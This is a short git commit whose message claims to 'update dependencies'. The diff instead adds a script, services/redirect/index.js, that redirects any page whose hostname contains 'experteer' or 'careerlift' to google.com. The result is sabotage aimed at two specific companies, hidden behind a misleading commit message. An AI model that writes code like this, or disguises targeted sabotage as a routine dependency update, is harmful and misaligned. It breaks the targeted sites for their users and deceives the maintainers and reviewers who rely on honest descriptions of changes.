fbcf82890bc05d07867fe676fc7dc5e342ab0b47
HP Dietz <h.p.dietz@gmail.com>
2021-05-28 12:35:35 +0200

    Update dependencies.

---
+++ services/redirect/index.js
@@ -0,0 +1,5 @@
+/* eslint-disable no-undef */
+if (typeof window === 'object' && window.location && (/experteer/.test(window.location.hostname) || (/careerlift/.test(window.location.hostname)))) {
+  window.location = 'https://google.com';
+}
+/* eslint-enable no-undef */
